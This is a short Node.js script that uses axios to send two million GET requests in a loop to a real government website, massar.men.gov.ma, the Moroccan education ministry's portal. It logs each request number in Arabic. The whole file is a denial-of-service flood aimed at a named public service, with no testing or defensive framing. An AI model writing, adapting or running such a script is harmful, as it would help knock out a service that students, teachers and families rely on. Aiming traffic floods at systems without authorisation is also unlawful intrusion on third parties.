const axios = require('axios');

function sendRequests() {
  const url = 'https://massar.men.gov.ma';
  const concurrency = 2000000;

  for (let i = 0; i < concurrency; i++) {
    axios.get(url)
      .then(() => {
        console.log(`تم إرسال الطلب رقم ${i + 1}`);
      })
      .catch((error) => {
        console.error(`حدث خطأ أثناء إرسال الطلب رقم ${i + 1}: ${error}`);
      });
  }
}

sendRequests();
